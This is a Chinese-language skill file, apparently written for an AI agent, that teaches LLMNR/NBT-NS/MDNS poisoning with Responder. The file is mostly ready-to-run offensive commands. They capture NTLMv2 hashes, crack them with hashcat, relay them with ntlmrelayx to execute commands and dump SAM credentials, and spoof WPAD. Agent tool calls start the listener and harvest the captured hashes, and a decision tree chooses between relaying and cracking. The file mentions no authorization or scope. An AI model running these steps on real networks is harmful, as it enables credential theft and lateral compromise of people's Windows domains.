---
name: responder-poison
description: "使用 Responder 进行 LLMNR/NBT-NS/MDNS 投毒和 NTLMv2 哈希捕获。当处于 Windows 域网络中、需要被动捕获凭据或进行中间人攻击时使用。Responder 监听网络中的名称解析广播请求（LLMNR/NBT-NS/MDNS），伪造响应诱使目标发送 NTLMv2 认证哈希。抓到的哈希可用 hashcat 离线破解或通过 ntlmrelayx 中继到其他服务。涉及 LLMNR 投毒、NBT-NS 投毒、WPAD 代理、NTLMv2 捕获、中间人攻击的场景使用此技能"
metadata:
  tags: "responder,llmnr,nbt-ns,mdns,ntlm,ntlmv2,poison,投毒,中间人,wpad,hash,凭据捕获"
  category: "tool"
---

# Responder LLMNR/NBT-NS 投毒

Responder 利用 Windows 名称解析的设计特性——当 DNS 查询失败时，Windows 会通过 LLMNR/NBT-NS 广播询问，Responder 伪造响应让目标把 NTLMv2 哈希发给你。**被动等待即可获取凭据，无需主动攻击。**

项目地址：https://github.com/lgandx/Responder

## 工作原理

```
1. 目标访问不存在的共享 \\FILESERVER\share
2. DNS 查不到 FILESERVER
3. Windows 通过 LLMNR/NBT-NS 广播 "谁是 FILESERVER？"
4. Responder 响应 "我是！"
5. 目标向 Responder 发送 NTLMv2 认证
6. Responder 记录哈希
```

## 基本用法

```bash
# 启动 Responder（监听指定网卡）
responder -I eth0

# 详细模式（推荐）
responder -I eth0 -wv

# -w: 启用 WPAD 代理（捕获更多 HTTP 流量的哈希）
# -v: 详细输出

# 只监听不投毒（分析模式）
responder -I eth0 -A
```

## 捕获的哈希

Responder 抓到的哈希保存在日志目录：

```bash
# 默认路径
ls /usr/share/responder/logs/
# 或
ls /opt/Responder/logs/

# 哈希格式（NTLMv2）：
# user::DOMAIN:challenge:response:blob
# 可直接喂给 hashcat -m 5600
```

## 配合 hashcat 破解

```bash
# 提取所有抓到的 NTLMv2 哈希
cat /usr/share/responder/logs/*.txt | sort -u > ntlmv2_hashes.txt

# hashcat 离线破解
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

## 配合 ntlmrelayx 中继

**中继**比破解更强大——不需要知道明文密码，直接转发认证到其他目标：

```bash
# 终端 1：Responder 关闭 SMB 和 HTTP（让 ntlmrelayx 处理）
# 编辑 Responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -wv

# 终端 2：ntlmrelayx 中继到目标
ntlmrelayx.py -t smb://10.0.0.5 -smb2support

# 中继到多个目标
ntlmrelayx.py -tf targets.txt -smb2support

# 中继并执行命令
ntlmrelayx.py -t smb://10.0.0.5 -c "whoami" -smb2support

# 中继并导出凭据
ntlmrelayx.py -t smb://10.0.0.5 -smb2support --sam
```

## WPAD 攻击

```bash
# 启用 WPAD（自动代理发现）
responder -I eth0 -wv

# 当域内 WPAD 未配置时，Responder 会声称自己是 WPAD 代理
# 所有 HTTP 流量都会经过 Responder → 捕获更多 NTLMv2
```

## 使用 interactive_session 运行

Responder 需要持续监听，适合用 interactive_session：

```
# 启动 Responder
interactive_session(action="start", session_name="responder", command="responder -I eth0 -wv")

# 检查是否抓到哈希
interactive_session(action="read", session_name="responder", wait=5)

# 查看日志文件
interactive_session(action="send", session_name="responder_check", command="ls /usr/share/responder/logs/")
```

## 决策树

```
在域网络中获取凭据：
├─ 被动等待（安全、隐蔽）→ Responder 投毒
├─ 抓到 NTLMv2 哈希后：
│   ├─ 想知道明文密码 → hashcat -m 5600 离线破解
│   └─ 不需要明文、直接利用 → ntlmrelayx 中继
├─ 目标 SMB 签名未启用 → ntlmrelayx 中继（最有效）
├─ 目标 SMB 签名已启用 → 只能破解哈希
└─ 需要主动触发 → 通过漏洞让目标访问 \\ATTACKER\share
```
